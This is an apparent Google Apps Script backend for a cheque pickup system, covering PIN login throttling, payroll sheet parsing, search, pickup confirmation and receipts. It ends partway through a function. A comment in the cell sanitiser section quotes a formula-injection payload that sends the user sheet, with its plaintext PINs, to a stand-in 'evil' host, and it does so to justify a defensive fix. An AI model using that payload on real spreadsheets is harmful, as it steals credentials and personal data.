// =============================================
// CHEQUE PICKUP SYSTEM — Google Apps Script
// =============================================
// SETUP:
// 1. Replace SPREADSHEET_ID and PHOTOS_FOLDER_ID below
// 2. Create a "_Users" sheet with columns: Name | PIN | Role | Offices | Clients
//    - Role: "admin" or "staff"
//    - Offices: "ALL" for admins, or comma-separated office names (e.g. "Toronto, Hamilton")
//    - Clients: comma-separated client names for cross-office access (e.g. "ABC Corp, XYZ Inc")
//    - Format PIN column as plain text to preserve leading zeros
// 3. Deploy → New deployment → Web app → Execute as: Me → Who has access: Anyone

const CONFIG = {
  SPREADSHEET_ID: '1woIHyeLMRLB0hqM7cERZgZ2SrHGpoUqgk2oAetQAfW0',
  PHOTOS_FOLDER_ID: '16sgCgoa_OXf5K5zllCqa92GbWRyt1zOv'
};

// ---- REQUEST ROUTING ----

function doPost(e) {
  try {
    var payload = JSON.parse(e.postData.contents);
    var action = payload.action;

    if (action === 'verifyPin') {
      return respond(verifyPin(payload.pin));
    }

    // Public receipt view — no PIN required. New receipt IDs carry a random
    // suffix (R-<ts>-<hex>) so they can't be enumerated; old timestamp-only IDs
    // remain valid for previously issued links.
    if (action === 'getReceiptPublic') {
      return respond(getReceipt(payload.receiptId, null));
    }

    // Per-PIN throttle only. A valid PIN is never blocked here (a correct
    // submission clears its own counter), so authenticated staff are unaffected
    // by anyone else's failed attempts. See the notes above pinLockStatus_.
    if (pinLockStatus_(payload.pin)) {
      return respond({ error: 'Too many failed attempts — try again in 15 minutes' });
    }
    var user = getUser(payload.pin);
    if (!user) {
      recordPinAttempt_(payload.pin, false);
      return respond({ error: 'Invalid PIN' });
    }
    recordPinAttempt_(payload.pin, true);

    switch (action) {
      case 'getWeeks':      return respond(getWeeks(user));
      case 'getWeekData':   return respond(getWeekData(payload.week, user, payload.office));
      case 'search':        return respond(searchCheques(payload.query, payload.week, payload.office, user));
      case 'confirmPickup': return respond(confirmPickup(payload, user));
      case 'getReceipt':    return respond(getReceipt(payload.receiptId, user));
      case 'updateComment': return respond(updateComment(payload, user));
      case 'uploadPayroll': return respond(uploadPayroll(payload, user));
      case 'voidCheques':   return respond(voidCheques(payload, user));
      case 'isAdmin':       return respond({ admin: user.role === 'admin' });

      // Posts / Bulletin Board
      case 'getPosts':           return respond(handleGetPosts(payload, user));
      case 'createPost':         return respond(handleCreatePost(payload, user));
      case 'resolvePost':        return respond(handleResolvePost(payload, user));
      case 'deletePost':         return respond(handleDeletePost(payload, user));
      case 'addPostComment':     return respond(handleAddPostComment(payload, user));
      case 'deletePostComment':  return respond(handleDeletePostComment(payload, user));

      default:              return respond({ error: 'Unknown action' });
    }
  } catch (err) {
    return respond({ error: err.toString() });
  }
}

function doGet(e) {
  return respond({ status: 'Cheque Pickup API running', time: new Date().toISOString() });
}

function respond(data) {
  return ContentService.createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}

// ---- WEEK DATE PARSING (for proper sort order) ----

function parseWeekDate(weekCode) {
  var mmdd = weekCode.substring(2);
  var mm = parseInt(mmdd.substring(0, 2), 10);
  var dd = parseInt(mmdd.substring(2, 4), 10);

  if (mm < 1 || mm > 12 || dd < 1 || dd > 31) return 0;

  var now = new Date();
  var year = now.getFullYear();
  var candidate = new Date(year, mm - 1, dd);

  if (candidate.getMonth() !== mm - 1 || candidate.getDate() !== dd) return 0;

  // Week codes carry no year, so infer the nearest one. The forward guard was
  // already here; the backward guard was missing, which meant that in late
  // December an early-January week resolved to January of the CURRENT year —
  // eleven months in the past. It then sorted below every week of the year just
  // ending, so staff auto-landed on a stale week at login and the live week fell
  // off the bottom of the dropdown (and out of the offline cache, which only
  // keeps the first four entries of weekOrder).
  var HALF_YEAR = 180 * 24 * 60 * 60 * 1000;
  if (candidate.getTime() - now.getTime() > HALF_YEAR) {
    candidate = new Date(year - 1, mm - 1, dd);
  } else if (now.getTime() - candidate.getTime() > HALF_YEAR) {
    candidate = new Date(year + 1, mm - 1, dd);
  }
  return candidate.getTime();
}

function sortWeeksDescending(weekArray) {
  return weekArray.slice().sort(function(a, b) {
    return parseWeekDate(b) - parseWeekDate(a);
  });
}

// ---- USER MANAGEMENT ----

function getUser(pin) {
  if (!pin) return null;
  var pinStr = String(pin).trim();

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheet = ss.getSheetByName('_Users');
  if (!sheet) return null;

  var data = sheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    var row = data[i];
    var rowPin = String(row[1] || '').trim();
    if (rowPin === pinStr) {
      var name = String(row[0] || '').trim();
      var role = String(row[2] || 'staff').trim().toLowerCase();
      var officesRaw = String(row[3] || '').trim();
      var clientsRaw = String(row[4] || '').trim();

      var offices = [];
      var isAllOffices = false;
      if (role === 'admin' || officesRaw.toUpperCase() === 'ALL') {
        isAllOffices = true;
      } else {
        offices = officesRaw.split(',').map(function(o) { return o.trim(); }).filter(function(o) { return o.length > 0; });
      }

      var clients = [];
      if (clientsRaw.length > 0) {
        clients = clientsRaw.split(',').map(function(c) { return c.trim(); }).filter(function(c) { return c.length > 0; });
      }

      return { name: name, role: role, offices: offices, allOffices: isAllOffices, clients: clients };
    }
  }
  return null;
}

function userCanAccessOffice(user, office) {
  if (!user) return false;
  if (user.allOffices) return true;
  var officeLower = office.toLowerCase();
  for (var i = 0; i < user.offices.length; i++) {
    var allowed = user.offices[i].toLowerCase();
    if (officeLower.indexOf(allowed) !== -1 || allowed.indexOf(officeLower) !== -1) return true;
  }
  return false;
}

function userHasClientAccess(user, clientName) {
  if (!user || !user.clients || user.clients.length === 0) return false;
  if (!clientName) return false;
  var clientLower = clientName.toLowerCase();
  for (var i = 0; i < user.clients.length; i++) {
    var allowed = user.clients[i].toLowerCase();
    if (clientLower.indexOf(allowed) !== -1 || allowed.indexOf(clientLower) !== -1) return true;
  }
  return false;
}

function userHasAnyClientAccess(user) {
  return user && user.clients && user.clients.length > 0;
}

function normalizeOffice(office) {
  return office.replace(/^OHRM\s+/i, '');
}

// ---- PIN VERIFICATION ----
// Brute-force throttling. The web app URL is public (it's in the GitHub Pages
// source) and a 4-digit PIN has only 10,000 combinations, so throttling is
// required. Apps Script exposes no client IP.
//
// FIX: the counter used to be a single global bucket checked BEFORE getUser on
// every action, so ten bad PINs from anywhere on the internet locked every user
// out of every action for 15 minutes — and cache.put refreshed the TTL on each
// failure, making it indefinite. Now:
//
//   1. Per-PIN counter (primary). Keyed by a hash of the submitted PIN, so one
//      attacker hammering a wrong PIN cannot affect anyone else. Note a VALID
//      PIN can never be locked this way: a correct submission succeeds and
//      clears its counter, so only wrong PIN strings ever accumulate failures.
//   2. Global counter (backstop) for enumeration — trying 10,000 distinct PINs
//      once each would never trip a per-PIN counter. Threshold is set far above
//      plausible typo volume, and it gates ONLY verifyPin. Staff who are already
//      authenticated keep working normally through an attack.

var PIN_LOCK_MAX_FAILS = 8;      // per distinct wrong PIN
var PIN_GLOBAL_MAX_FAILS = 60;   // across all PINs; gates new logins only
var PIN_LOCK_SECONDS = 900;      // 15 minutes

function pinFailKey_(pin) {
  var digest = Utilities.computeDigest(Utilities.DigestAlgorithm.MD5, String(pin || ''));
  var hex = '';
  for (var i = 0; i < 6; i++) {
    var b = digest[i] < 0 ? digest[i] + 256 : digest[i];
    hex += ('0' + b.toString(16)).slice(-2);
  }
  return 'pf_' + hex;
}

// Per-PIN lock. Safe to call on every request — never blocks a valid PIN.
function pinLockStatus_(pin) {
  var fails = Number(CacheService.getScriptCache().get(pinFailKey_(pin)) || 0);
  return fails >= PIN_LOCK_MAX_FAILS;
}

// Global lock. Only consulted by verifyPin, never by authenticated actions.
function pinGlobalLockStatus_() {
  var fails = Number(CacheService.getScriptCache().get('pin_fails_global') || 0);
  return fails >= PIN_GLOBAL_MAX_FAILS;
}

function recordPinAttempt_(pin, success) {
  var cache = CacheService.getScriptCache();
  var key = pinFailKey_(pin);
  if (success) { cache.remove(key); return; }
  var fails = Number(cache.get(key) || 0) + 1;
  cache.put(key, String(fails), PIN_LOCK_SECONDS);
  var g = Number(cache.get('pin_fails_global') || 0) + 1;
  cache.put('pin_fails_global', String(g), PIN_LOCK_SECONDS);
}

function verifyPin(pin) {
  if (pinLockStatus_(pin) || pinGlobalLockStatus_()) {
    return { ok: false, error: 'Too many failed attempts — try again in 15 minutes' };
  }
  var user = getUser(pin);
  recordPinAttempt_(pin, !!user);
  if (user) {
    return {
      ok: true,
      user: { name: user.name, role: user.role, offices: user.offices, allOffices: user.allOffices, clients: user.clients }
    };
  }
  return { ok: false, error: 'Incorrect PIN' };
}

// ---- CELL WRITE SANITISER ----
// FIX: Apps Script setValue()/appendRow() on a string starting with '=' enters a
// LIVE FORMULA, not text. Any PIN holder could save a comment of
//   =IMAGE("https://evil/?d="&ENCODEURL(TEXTJOIN("|",1,_Users!A1:E50)))
// and have Google's own servers exfiltrate the whole _Users sheet — every name,
// plaintext PIN and office scope — on recalculation. Also blocks DDE payloads
// from reaching anyone who opens a CSV/XLSX export in Excel.
// Applied at every point client-supplied text reaches a cell.
function sanitizeCell_(v) {
  if (v === null || v === undefined) return '';
  if (typeof v === 'number' || typeof v === 'boolean' || v instanceof Date) return v;
  var s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

function sanitizeRow_(arr) {
  return arr.map(sanitizeCell_);
}

// ---- GET AVAILABLE WEEKS & OFFICES ----

function getWeeks(user) {
  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheets = ss.getSheets();
  var weeks = {};

  sheets.forEach(function(sheet) {
    var name = sheet.getName();
    var idx = name.indexOf('_');
    if (idx === -1) return;
    var week = name.substring(0, idx).toUpperCase();
    var office = normalizeOffice(name.substring(idx + 1));
    if (!/^WE\d{4}$/.test(week)) return;

    var hasOfficeAccess = user ? userCanAccessOffice(user, office) : true;
    var hasClientEntries = user ? userHasAnyClientAccess(user) : false;

    if (!hasOfficeAccess && !hasClientEntries) return;

    if (!weeks[week]) weeks[week] = [];
    if (weeks[week].indexOf(office) === -1) weeks[week].push(office);
  });

  var sortedWeekKeys = sortWeeksDescending(Object.keys(weeks));
  var sorted = {};
  sortedWeekKeys.forEach(function(w) { sorted[w] = weeks[w].sort(); });
  return { weeks: sorted, weekOrder: sortedWeekKeys };
}

// Explain WHY column detection failed, so the UI can show something actionable
// instead of an empty list. detectColumns requires lastName, chqNo, signature
// and mode; a renamed header or a merged header cell drops one of them.
function describeColumnFailure_(data, sheetName) {
  var required = ['lastName', 'chqNo', 'signature', 'mode'];
  var labels = { lastName: 'Last Name', chqNo: 'Chq No.', signature: 'Signature', mode: 'Mode' };
  var best = null, bestCount = -1;

  for (var r = 0; r < Math.min(data.length, 20); r++) {
    var partial = detectColumnsInRow_(data[r]);
    var found = 0;
    for (var i = 0; i < required.length; i++) if (partial[required[i]] !== undefined) found++;
    if (found > bestCount) { bestCount = found; best = partial; }
  }

  var missing = [];
  for (var j = 0; j < required.length; j++) {
    if (!best || best[required[j]] === undefined) missing.push(labels[required[j]]);
  }

  if (missing.length === 0) {
    return sheetName + ': could not read the header row. Check for merged header cells — Google Sheets only returns a merged value in its top-left cell.';
  }
  return sheetName + ': missing required column' + (missing.length !== 1 ? 's' : '') + ' — ' + missing.join(', ')
       + '. Cheques in this office will not appear until the header row is corrected or the name is added to detectColumns().';
}

// ---- READ CHEQUES FROM A SINGLE SHEET (shared helper) ----

function readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess, warnings) {
  var cheques = [];
  var data = sheet.getDataRange().getValues();
  var colMap = detectColumns(data);
  if (!colMap) {
    // FIX: this used to return an empty array silently. The office still appeared
    // in the dropdown and every search said "No cheques match" — indistinguishable
    // from an empty week, with no error anywhere. Report which columns are missing
    // so the cause is visible instead of being diagnosed as a flaky search.
    if (warnings) warnings.push(describeColumnFailure_(data, name));
    return cheques;
  }

  for (var i = colMap.headerRow + 1; i < data.length; i++) {
    var row = data[i];
    var mode = colMap.mode !== undefined ? String(row[colMap.mode] || '').trim().toUpperCase() : '';
    var isCheque = (mode === 'CHQ' || mode === 'CHEQUE' || mode === 'CQ' || mode === 'CHECK');
    if (!isCheque) continue;

    var lastName = String(row[colMap.lastName] || '').trim();
    var firstName = colMap.firstName !== undefined ? String(row[colMap.firstName] || '').trim() : '';
    var client = colMap.client !== undefined ? String(row[colMap.client] || '').trim() : '';
    var chqNo = String(row[colMap.chqNo] || '').trim();
    var netPay = parseFloat(row[colMap.netPay]) || 0;
    var payRate = colMap.payRate !== undefined ? (parseFloat(row[colMap.payRate]) || 0) : 0;
    var hours = colMap.hours !== undefined ? (parseFloat(row[colMap.hours]) || 0) : 0;
    var signature = String(row[colMap.signature] || '').trim();
    var comment = colMap.comments !== undefined ? String(row[colMap.comments] || '').trim() : '';
    var empNo = colMap.empNo !== undefined ? String(row[colMap.empNo] || '').trim() : '';
    var jigId = colMap.jigId !== undefined ? String(row[colMap.jigId] || '').trim() : '';

    if ((!lastName && !firstName) || !chqNo || netPay <= 0) continue;
    if (!hasOfficeAccess && !userHasClientAccess(user, client)) continue;

    cheques.push({
      uid: week + '_' + office + '_' + i,
      week: week, office: office, rowIndex: i,
      commentCol: colMap.comments !== undefined ? colMap.comments : -1,
      sheetName: name,
      lastName: lastName, firstName: firstName,
      client: client, chqNo: chqNo, netPay: netPay,
      payRate: payRate, hours: hours,
      empNo: empNo, jigId: jigId,
      hasSignature: signature.length > 0,
      signatureText: signature, comment: comment
    });
  }
  return cheques;
}

// ---- GET SINGLE WEEK DATA ----

function getWeekData(week, user, officeFilter) {
  if (!week) return { error: 'No week specified' };
  week = week.toUpperCase();
  var filterOffice = (officeFilter && officeFilter !== 'ALL') ? officeFilter : null;

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheets = ss.getSheets();
  var allCheques = [];
  var warnings = [];

  sheets.forEach(function(sheet) {
    var name = sheet.getName();
    var idx = name.indexOf('_');
    if (idx === -1) return;
    var sheetWeek = name.substring(0, idx).toUpperCase();
    var office = normalizeOffice(name.substring(idx + 1));
    if (sheetWeek !== week) return;
    if (!/^WE\d{4}$/.test(sheetWeek)) return;

    if (filterOffice && office !== filterOffice) return;

    var hasOfficeAccess = user ? userCanAccessOffice(user, office) : true;
    var hasClientEntries = user ? userHasAnyClientAccess(user) : false;
    if (!hasOfficeAccess && !hasClientEntries) return;

    var cheques = readChequesFromSheet(sheet, name, week, office, user, hasOfficeAccess, warnings);
    allCheques = allCheques.concat(cheques);
  });

  return {
    week: week, office: filterOffice || 'ALL', cheques: allCheques,
    warnings: warnings, timestamp: new Date().toISOString()
  };
}

// ---- COLUMN DETECTION ----

function detectColumns(data) {
  for (var r = 0; r < Math.min(data.length, 15); r++) {
    var row = data[r];
    if (!row) continue;
    var found = false;
    for (var c = 0; c < row.length; c++) {
      if (!row[c]) continue;
      var v = String(row[c]).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
      if (v === 'last name' || v === 'surname' || v === 'family name' || v === 'lastname') {
        found = true; break;
      }
    }
    if (!found) continue;

    var map = detectColumnsInRow_(row);

    if (map.lastName !== undefined && map.chqNo !== undefined && map.signature !== undefined && map.mode !== undefined) {
      map.headerRow = r;
      return map;
    }
  }
  return null;
}

// Header-name → column-index mapping for a single row. Extracted from
// detectColumns so describeColumnFailure_ can report which columns are missing.
function detectColumnsInRow_(row) {
  var map = {};
  if (!row) return map;

  for (var c2 = 0; c2 < row.length; c2++) {
    var val = row[c2];
    if (!val) continue;
    var nm = String(val).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();

    {
      if (map.lastName === undefined && (nm === 'last name' || nm === 'surname' || nm === 'family name' || nm === 'lastname')) map.lastName = c2;
      else if (map.firstName === undefined && (nm === 'first name' || nm === 'given name' || nm === 'firstname')) map.firstName = c2;
      else if (map.client === undefined && nm.indexOf('client') !== -1) map.client = c2;
      else if (map.mode === undefined && (nm === 'mode' || nm === 'pay mode' || nm === 'payment type' || nm === 'payment mode' || nm === 'payment method' || nm === 'pay method' || nm === 'method' || nm === 'pay type')) map.mode = c2;
      else if (map.chqNo === undefined && (nm.indexOf('chq') !== -1 || nm.indexOf('cheque') !== -1 || nm.indexOf('check') !== -1) && (nm.indexOf('no') !== -1 || nm.indexOf('num') !== -1 || nm.indexOf('#') !== -1)) map.chqNo = c2;
      else if (map.netPay === undefined && nm.indexOf('net') !== -1 && nm.indexOf('pay') !== -1) map.netPay = c2;
      else if (map.payRate === undefined && (nm === 'rate' || nm === 'pay rate' || nm === 'hourly rate' || nm === 'rate of pay' || nm === 'rate/hr' || nm === 'rate/hour' || nm === 'rate per hour' || nm === 'hr rate' || nm === 'hourly')) map.payRate = c2;
      else if (map.hours === undefined && (nm === 'hours' || nm === 'hrs' || nm === 'reg hours' || nm === 'reg. hours' || nm === 'regular hours' || nm === 'reg hrs' || nm === 'reg. hrs' || nm === 'total hours' || nm === 'total hrs' || nm === 'hours worked' || nm === 'hrs worked')) map.hours = c2;
      else if (map.signature === undefined && (nm === 'signature' || nm === 'sign' || nm === 'proof' || nm === 'sig' || nm === 'sig.' || nm === 'signed' || nm === 'signed by' || nm === 'received by' || nm === 'collected by')) map.signature = c2;
      else if (map.comments === undefined && (nm === 'comment' || nm === 'comments' || nm === 'remarks' || nm === 'remark' || nm === 'notes' || nm === 'note')) map.comments = c2;
      // FIX: 'Emp. No.' (period after Emp) was missing, and two of the six header
      // layouts in the live workbook use exactly that — so those offices silently
      // lost the employee-number column: no Emp badge, no search by employee
      // number, and no prefill on the missing-hours form.
      else if (map.empNo === undefined && (nm === 'emp no' || nm === 'emp no.' || nm === 'emp. no' || nm === 'emp. no.' || nm === 'emp.no.' || nm === 'emp #' || nm === 'emp. #' || nm === 'employee no' || nm === 'employee no.' || nm === 'employee #' || nm === 'employee number' || nm === 'empno')) map.empNo = c2;
      else if (map.jigId === undefined && (nm === 'jig_id' || nm === 'jig id' || nm === 'jigid' || nm === 'jig_no' || nm === 'jig no' || nm === 'jig #')) map.jigId = c2;
    }
  }

  if (map.netPay === undefined) {
    for (var c3 = 0; c3 < row.length; c3++) {
      var val3 = row[c3]; if (!val3) continue;
      var nm3 = String(val3).toLowerCase().replace(/[\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
      if (nm3.indexOf('net') !== -1 || nm3 === 'take home' || nm3 === 'take home pay') { map.netPay = c3; break; }
    }
  }

  return map;
}

// ---- SEARCH CHEQUES ----

function searchCheques(query, weekFilter, officeFilter, user) {
  if (!query || query.length < 2) return { results: [] };

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheets = ss.getSheets();
  var results = [];
  var q = query.toLowerCase();

  sheets.forEach(function(sheet) {
    var name = sheet.getName();
    var idx = name.indexOf('_');
    if (idx === -1) return;
    var week = name.substring(0, idx).toUpperCase();
    var office = normalizeOffice(name.substring(idx + 1));
    if (!/^WE\d{4}$/.test(week)) return;

    var hasOfficeAccess = user ? userCanAccessOffice(user, office) : true;
    var hasClientEntries = user ? userHasAnyClientAccess(user) : false;
    if (!hasOfficeAccess && !hasClientEntries) return;
    if (weekFilter && weekFilter !== 'ALL' && week !== weekFilter) return;
    if (officeFilter && officeFilter !== 'ALL' && office !== officeFilter) return;

    var data = sheet.getDataRange().getValues();
    var colMap = detectColumns(data);
    if (!colMap) return;

    for (var i = colMap.headerRow + 1; i < data.length; i++) {
      var row = data[i];
      var mode = colMap.mode !== undefined ? String(row[colMap.mode] || '').trim().toUpperCase() : '';
      var isCheque = (mode === 'CHQ' || mode === 'CHEQUE' || mode === 'CQ' || mode === 'CHECK');
      if (!isCheque) continue;

      var lastName = String(row[colMap.lastName] || '').trim();
      var firstName = colMap.firstName !== undefined ? String(row[colMap.firstName] || '').trim() : '';
      var client = colMap.client !== undefined ? String(row[colMap.client] || '').trim() : '';
      var chqNo = String(row[colMap.chqNo] || '').trim();
      var netPay = parseFloat(row[colMap.netPay]) || 0;
      var payRate = colMap.payRate !== undefined ? (parseFloat(row[colMap.payRate]) || 0) : 0;
      var hours = colMap.hours !== undefined ? (parseFloat(row[colMap.hours]) || 0) : 0;
      var signature = String(row[colMap.signature] || '').trim();
      var comment = colMap.comments !== undefined ? String(row[colMap.comments] || '').trim() : '';
      var empNo = colMap.empNo !== undefined ? String(row[colMap.empNo] || '').trim() : '';
      var jigId = colMap.jigId !== undefined ? String(row[colMap.jigId] || '').trim() : '';

      if ((!lastName && !firstName) || !chqNo || netPay <= 0) continue;
      if (!hasOfficeAccess && !userHasClientAccess(user, client)) continue;

      var fullLower = (lastName + ' ' + firstName).toLowerCase();
      if (fullLower.indexOf(q) === -1 &&
          lastName.toLowerCase().indexOf(q) === -1 &&
          firstName.toLowerCase().indexOf(q) === -1 &&
          client.toLowerCase().indexOf(q) === -1 &&
          chqNo.toLowerCase().indexOf(q) === -1 &&
          empNo.toLowerCase().indexOf(q) === -1 &&
          jigId.toLowerCase().indexOf(q) === -1) continue;

      results.push({
        uid: week + '_' + office + '_' + i,
        week: week, office: office, rowIndex: i,
        commentCol: colMap.comments !== undefined ? colMap.comments : -1,
        sheetName: name,
        lastName: lastName, firstName: firstName,
        fullName: lastName + ' ' + firstName,
        client: client, chqNo: chqNo, netPay: netPay,
        payRate: payRate, hours: hours,
        empNo: empNo, jigId: jigId,
        hasSignature: signature.length > 0,
        signatureText: signature, comment: comment
      });
    }
  });

  results.sort(function(a, b) {
    var aCol = a.hasSignature ? 1 : 0;
    var bCol = b.hasSignature ? 1 : 0;
    if (aCol !== bCol) return aCol - bCol;
    return (parseInt(a.chqNo) || 0) - (parseInt(b.chqNo) || 0);
  });

  return { results: results };
}

// ---- SERVER-SIDE VALIDATION ----

function validateSheet(sheetName, user) {
  if (!sheetName || typeof sheetName !== 'string') return { error: 'Invalid sheet name' };
  var idx = sheetName.indexOf('_');
  if (idx === -1) return { error: 'Invalid sheet format' };
  var week = sheetName.substring(0, idx).toUpperCase();
  var office = normalizeOffice(sheetName.substring(idx + 1));
  if (!/^WE\d{4}$/.test(week)) return { error: 'Invalid week format: ' + week };

  var hasOfficeAccess = userCanAccessOffice(user, office);
  var hasClientEntries = userHasAnyClientAccess(user);
  if (!hasOfficeAccess && !hasClientEntries) return { error: 'Access denied to office: ' + office };

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var sheet = ss.getSheetByName(sheetName);
  if (!sheet) return { error: 'Sheet not found: ' + sheetName };

  var data = sheet.getDataRange().getValues();
  var colMap = detectColumns(data);
  if (!colMap) return { error: 'Could not detect columns in: ' + sheetName };

  return { sheet: sheet, data: data, colMap: colMap, week: week, office: office, hasOfficeAccess: hasOfficeAccess };
}

function validateChequeRow(data, colMap, rowIndex, user, hasOfficeAccess, expectedChqNo) {
  if (rowIndex === undefined || rowIndex === null || rowIndex < colMap.headerRow + 1 || rowIndex >= data.length) {
    return { error: 'Invalid row index' };
  }

  var row = data[rowIndex];
  var mode = colMap.mode !== undefined ? String(row[colMap.mode] || '').trim().toUpperCase() : '';
  var isCheque = (mode === 'CHQ' || mode === 'CHEQUE' || mode === 'CQ' || mode === 'CHECK');
  if (!isCheque) return { error: 'Row is not a cheque entry' };

  var lastName = String(row[colMap.lastName] || '').trim();
  var firstName = colMap.firstName !== undefined ? String(row[colMap.firstName] || '').trim() : '';
  var client = colMap.client !== undefined ? String(row[colMap.client] || '').trim() : '';
  var chqNo = String(row[colMap.chqNo] || '').trim();

  if (!lastName && !firstName) return { error: 'Row has no name data' };
  if (!chqNo) return { error: 'Row has no cheque number' };

  if (expectedChqNo && String(expectedChqNo).trim() !== chqNo) {
    return { error: 'Cheque number mismatch: expected ' + expectedChqNo + ' but found ' + chqNo };
  }

  if (!hasOfficeAccess && !userHasClientAccess(user, client)) {
    return { error: 'Access denied to this cheque' };
  }

  return { ok: true, chqNo: chqNo, lastName: lastName, firstName: firstName, client: client };
}

// ---- SHARED HELPERS: photo upload + receipt row write ----

function uploadPhoto_(photoBase64, photoFilename, weekEnding) {
  if (!photoBase64) return { url: '', error: '' };
  try {
    var parentFolder = DriveApp.getFolderById(CONFIG.PHOTOS_FOLDER_ID);
    var folders = parentFolder.getFoldersByName(weekEnding || 'Unknown_Week');
    var weekFolder = folders.hasNext() ? folders.next() : parentFolder.createFolder(weekEnding || 'Unknown_Week');
    var decoded = Utilities.base64Decode(photoBase64);
    var blob = Utilities.newBlob(decoded, 'image/jpeg', photoFilename || 'pickup.jpg');
    var file = weekFolder.createFile(blob);
    return { url: file.getUrl(), error: '' };
  } catch (err) {
    return { url: '', error: err.toString() };
  }
}

function writeReceiptRow_(ss, receiptId, distributor, collector, timestamp, weekEnding, photoUrl, chequeLocators) {
  // chequeLocators: [{ chqNo, sheetName, rowIndex }] — locators only.
  // All display data is re-fetched live from source sheets at view time.
  try {
    var receiptSheet = ss.getSheetByName('_Receipts');
    if (!receiptSheet) {
      receiptSheet = ss.insertSheet('_Receipts');
      receiptSheet.getRange(1, 1, 1, 7).setValues([['Receipt ID', 'Distributor', 'Collector', 'Timestamp', 'Week Ending', 'Photo URL', 'Cheques']]);
      receiptSheet.setFrozenRows(1);
    } else {
      var headerRow = receiptSheet.getRange(1, 1, 1, receiptSheet.getLastColumn()).getValues()[0];
      if (headerRow.length >= 2 && String(headerRow[1]).trim() !== 'Distributor') {
        receiptSheet.insertColumnBefore(2);
        receiptSheet.getRange(1, 2).setValue('Distributor');
      }
    }
    // Server-authoritative timestamp (col 8) — device clocks can be wrong, and
    // the client-sent timestamp goes into permanent records. Extra column is
    // ignored by all existing readers.
    if (String(receiptSheet.getRange(1, 8).getValue() || '').trim() === '') {
      receiptSheet.getRange(1, 8).setValue('ServerTime');
    }
    // FIX: receiptId, collector, timestamp and weekEnding are raw client fields.
    // sanitizeCell_ stops a leading '=' becoming a live formula in the audit sheet.
    receiptSheet.appendRow(sanitizeRow_([
      receiptId, distributor, collector, timestamp, weekEnding, photoUrl,
      JSON.stringify(chequeLocators), new Date().toISOString()
    ]));
    return true;
  } catch (err) {
    // FIX: this used to swallow the failure silently while the caller still
    // returned a receiptId and the UI still showed a QR code — the employee
    // scanned it and got "Receipt not found". Report it so the client can say so.
    return false;
  }
}

// ---- CONFIRM PICKUP ----

function confirmPickup(data, user) {
  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var results = [];
  var receiptId = data.receiptId || ('R-' + new Date().getTime());
  var distributor = (user && user.name) ? user.name : '';
  var collector = data.collector || '';

  var sigParts = [];
  if (distributor) sigParts.push('Distributed by ' + distributor);
  if (collector) sigParts.push('Collected by ' + collector);
  var sigText = sigParts.join(' | ') + ' \u2014 ' + data.timestamp + ' [' + receiptId + ']';

  var anySuccess = false;
  var alreadyCollected = [];
  var writtenLocators = [];

  var lock = LockService.getScriptLock();
  try { lock.waitLock(15000); }
  catch (e) { return { error: 'Server busy — please try again in a moment', results: [] }; }

  try {
    var sheetCache = {};

    for (var i = 0; i < data.cheques.length; i++) {
      var c = data.cheques[i];

      if (!sheetCache[c.sheetName]) sheetCache[c.sheetName] = validateSheet(c.sheetName, user);
      var sv = sheetCache[c.sheetName];
      if (sv.error) { results.push({ uid: c.uid, error: sv.error }); continue; }

      var rv = validateChequeRow(sv.data, sv.colMap, c.rowIndex, user, sv.hasOfficeAccess, c.chqNo);
      if (rv.error) { results.push({ uid: c.uid, error: rv.error }); continue; }

      var cell = sv.sheet.getRange(c.rowIndex + 1, sv.colMap.signature + 1);
      var currentVal = String(cell.getValue() || '').trim();

      if (currentVal.length > 0) {
        results.push({ uid: c.uid, error: 'Already collected', signature: currentVal });
        // FIX: was a bare chqNo string — the frontend needs the uid to tell
        // "already collected" (drop from cart) apart from "write failed"
        // (keep in cart for retry). Old clients only read .length — compatible.
        alreadyCollected.push({ uid: c.uid, chqNo: rv.chqNo || '' });
        continue;
      }

      cell.setValue(sigText);
      results.push({ uid: c.uid, ok: true });
      // FIX: record the locator only for cheques actually written. This used to
      // be built from data.cheques (the whole submitted cart) after the loop, so
      // a cheque rejected as already-collected still appeared on the receipt —
      // the employee's copy overstated both the count and the total.
      writtenLocators.push({ chqNo: rv.chqNo || c.chqNo, sheetName: c.sheetName, rowIndex: c.rowIndex });
      anySuccess = true;
    }
    // FIX: force the buffered signature writes out before releasing the lock.
    // Without this the last setValue could still be buffered while the next
    // request acquires the lock and reads the cell as empty.
    SpreadsheetApp.flush();
  } finally {
    lock.releaseLock();
  }

  var photo = anySuccess ? uploadPhoto_(data.photoBase64, data.photoFilename, data.weekEnding) : { url: '', error: '' };

  var receiptWritten = false;
  if (anySuccess) {
    receiptWritten = writeReceiptRow_(ss, receiptId, distributor, collector, data.timestamp, data.weekEnding, photo.url, writtenLocators);
  }

  return {
    results: results, receiptId: receiptId, photoUrl: photo.url, photoError: photo.error,
    alreadyCollected: alreadyCollected, receiptWritten: receiptWritten
  };
}

// ---- GET RECEIPT ----

function getReceipt(receiptId, user) {
  if (!receiptId) return { error: 'No receipt ID provided' };

  var ss = SpreadsheetApp.openById(CONFIG.SPREADSHEET_ID);
  var receiptsSheet = ss.getSheetByName('_Receipts');
  if (!receiptsSheet) return { error: 'No receipts found' };

  // Find the receipt row
  var receiptStr = String(receiptId).trim();
  var finder = receiptsSheet.getRange(1, 1, receiptsSheet.getLastRow(), 1).createTextFinder(receiptStr).matchEntireCell(true);
  var found = finder.findNext();
  if (!found) return { error: 'Receipt not found' };

  var rowNum = found.getRow();
  var row = receiptsSheet.getRange(rowNum, 1, 1, receiptsSheet.getLastColumn()).getValues()[0];
  var headerRow = receiptsSheet.getRange(1, 1, 1, receiptsSheet.getLastColumn()).getValues()[0];
